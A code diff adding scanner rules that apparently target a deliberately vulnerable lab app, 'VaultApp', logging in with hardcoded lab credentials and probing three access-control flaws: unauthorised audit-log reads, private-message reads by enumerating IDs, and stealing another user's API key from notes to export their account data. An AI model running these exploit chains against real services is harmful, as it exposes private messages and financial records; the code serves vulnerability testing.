@@ -65031,6 +65031,269 @@ const vaultappLabGuideRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+type VaultappAuth = { token: string; userId: number; username: string };
+
+const VAULTAPP_LAB_CREDENTIALS = [
+  { username: "sysadmin", password: "adminpass1" },
+  { username: "rootadmin", password: "adminpass2" },
+  { username: "player", password: "player123" }
+] as const;
+
+async function vaultappLogin(ctx: RuleContext): Promise<VaultappAuth | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+  for (const creds of VAULTAPP_LAB_CREDENTIALS) {
+    const doc = await ctx.probe.get(loginUrl, {
+      method: "POST",
+      body: JSON.stringify({ username: creds.username, password: creds.password }),
+      headers: { "Content-Type": "application/json", Accept: "application/json" },
+      maxBytes: 4096,
+      timeoutMs: 20000
+    });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    try {
+      const data = JSON.parse(doc.body) as {
+        token?: string;
+        user?: { id?: number; username?: string };
+      };
+      if (data.token && data.user?.id && data.user.username) {
+        return { token: data.token, userId: data.user.id, username: data.user.username };
+      }
+    } catch {
+      /* try next credential */
+    }
+  }
+  return null;
+}
+
+async function probeVaultappAdminAuditLogsIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const headers = {
+    Authorization: `Bearer ${auth.token}`,
+    Accept: "application/json"
+  };
+  const probeUserId = auth.userId === 299 ? 10 : 299;
+  const auditUrl = new URL("/api/admin/audit-logs", ctx.origin);
+  auditUrl.searchParams.set("user_id", String(probeUserId));
+  const doc = await ctx.probe.get(auditUrl.toString(), {
+    headers,
+    maxBytes: 16384,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  try {
+    const data = JSON.parse(doc.body) as {
+      user_id?: number;
+      total?: number;
+      logs?: Array<{ action?: string; user_username?: string }>;
+    };
+    if (data.user_id !== probeUserId || !Array.isArray(data.logs) || data.logs.length < 1) return null;
+    const sample = data.logs[0];
+    if (!sample?.action) return null;
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        auditUrl: auditUrl.toString(),
+        caller: auth.username,
+        queriedUserId: probeUserId,
+        logCount: data.logs.length,
+        sampleAction: sample.action,
+        sampleUser: sample.user_username,
+        snippet: doc.body.slice(0, 280).trim(),
+        note: `VaultApp GET /api/admin/audit-logs?user_id=${probeUserId} returns admin audit entries for authenticated ${auth.username} without role check — admin audit-log IDOR oracle`
+      }
+    };
+  } catch {
+    return null;
+  }
+}
+
+const vaultappAdminAuditLogsIdorLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappAdminAuditLogsIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vaultappAdminAuditLogsIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/admin\/audit-logs/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappAdminAuditLogsIdor(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "VaultApp /api/admin/audit-logs route scan — any authenticated user queries audit logs for arbitrary user_id without admin role — IDOR oracle"
+    }
+  };
+};
+
+async function probeVaultappMessagesReadIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const readUrl = new URL("/api/messages/read", ctx.origin).toString();
+  const headers = {
+    Authorization: `Bearer ${auth.token}`,
+    "Content-Type": "application/json",
+    Accept: "application/json"
+  };
+  for (let messageId = 1; messageId <= 60; messageId++) {
+    const doc = await ctx.probe.get(readUrl, {
+      method: "POST",
+      body: JSON.stringify({ message_id: messageId }),
+      headers,
+      maxBytes: 4096,
+      timeoutMs: 15000
+    });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    try {
+      const data = JSON.parse(doc.body) as {
+        id?: number;
+        subject?: string;
+        body?: string;
+        receiver_username?: string;
+        sender_username?: string;
+      };
+      if (!data.id || !data.body || !data.receiver_username) continue;
+      if (
+        data.receiver_username === auth.username &&
+        data.sender_username === auth.username
+      ) {
+        continue;
+      }
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          readUrl,
+          caller: auth.username,
+          messageId: data.id,
+          receiver: data.receiver_username,
+          sender: data.sender_username,
+          subject: data.subject,
+          snippet: doc.body.slice(0, 280).trim(),
+          note: `VaultApp POST /api/messages/read message_id=${data.id} returns private message for ${data.receiver_username} to authenticated ${auth.username} without ownership check — message-read IDOR oracle`
+        }
+      };
+    } catch {
+      /* try next id */
+    }
+  }
+  return null;
+}
+
+const vaultappMessagesReadIdorLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappMessagesReadIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vaultappMessagesReadIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/messages\/read/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappMessagesReadIdor(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "VaultApp /api/messages/read route scan — POST message_id reads another user's private message without ownership check — IDOR oracle"
+    }
+  };
+};
+
+async function probeVaultappAccountExportApiKeyIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const authHeaders = {
+    Authorization: `Bearer ${auth.token}`,
+    Accept: "application/json"
+  };
+  let victimApiKey: string | null = null;
+  let victimUsername: string | null = null;
+  for (let noteId = 1; noteId <= 120 && !victimApiKey; noteId++) {
+    const noteUrl = new URL(`/api/notes/${noteId}`, ctx.origin).toString();
+    const noteDoc = await ctx.probe.get(noteUrl, {
+      headers: authHeaders,
+      maxBytes: 4096,
+      timeoutMs: 12000
+    });
+    if (noteDoc.status < 200 || noteDoc.status >= 300) continue;
+    const keyMatch = noteDoc.body.match(/My API key:\s*([a-f0-9]{32})/i);
+    if (!keyMatch) continue;
+    try {
+      const note = JSON.parse(noteDoc.body) as { owner_username?: string };
+      if (note.owner_username && note.owner_username !== auth.username) {
+        victimApiKey = keyMatch[1];
+        victimUsername = note.owner_username;
+      }
+    } catch {
+      /* skip */
+    }
+  }
+  if (!victimApiKey || !victimUsername) return null;
+  const exportUrl = new URL("/api/account/export", ctx.origin).toString();
+  const exportDoc = await ctx.probe.get(exportUrl, {
+    headers: { ...authHeaders, "X-API-Key": victimApiKey },
+    maxBytes: 16384,
+    timeoutMs: 20000
+  });
+  if (exportDoc.status < 200 || exportDoc.status >= 300) return null;
+  try {
+    const data = JSON.parse(exportDoc.body) as {
+      profile?: { username?: string; email?: string; account_number?: string };
+      transactions?: unknown[];
+    };
+    if (data.profile?.username !== victimUsername || !data.profile.email) return null;
+    return {
+      fired: true,
+      confidence: 0.95,
+      evidence: {
+        exportUrl,
+        caller: auth.username,
+        victim: victimUsername,
+        victimAccount: data.profile.account_number,
+        transactionCount: Array.isArray(data.transactions) ? data.transactions.length : 0,
+        snippet: exportDoc.body.slice(0, 280).trim(),
+        note: `VaultApp GET /api/account/export with victim X-API-Key exports ${victimUsername} profile and transactions while authenticated as ${auth.username} — API-key impersonation IDOR oracle`
+      }
+    };
+  } catch {
+    return null;
+  }
+}
+
+const vaultappAccountExportApikeyLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappAccountExportApiKeyIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vaultappAccountExportApikeyRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/account\/export/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappAccountExportApiKeyIdor(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "VaultApp /api/account/export route scan — X-API-Key header exports another user's account data without session binding — API-key impersonation IDOR oracle"
+    }
+  };
+};
+
 // --- Archon engineering knowledge platform — cybersecurity training path --------------
 const CLIENT_ARCHON_TRAINING_RES: { label: string; re: RegExp }[] = [
   {
@@ -67504,6 +67767,12 @@ export const RULES: Record<string, Rule> = {
   dvwuSsrfRedirectRouteLiveOracle,
   vulnExposeXssPlaygroundRouteLiveOracle,
   vaultappLabGuideRouteLiveOracle,
+  vaultappAdminAuditLogsIdorLiveOracle,
+  vaultappAdminAuditLogsIdorRouteLiveOracle,
+  vaultappMessagesReadIdorLiveOracle,
+  vaultappMessagesReadIdorRouteLiveOracle,
+  vaultappAccountExportApikeyLiveOracle,
+  vaultappAccountExportApikeyRouteLiveOracle,
   clientSideArchonTrainingEvidence,
   clientSideArchonApiSecurityCurriculumEvidence,
   clientSideOverthewireBanditEvidence,
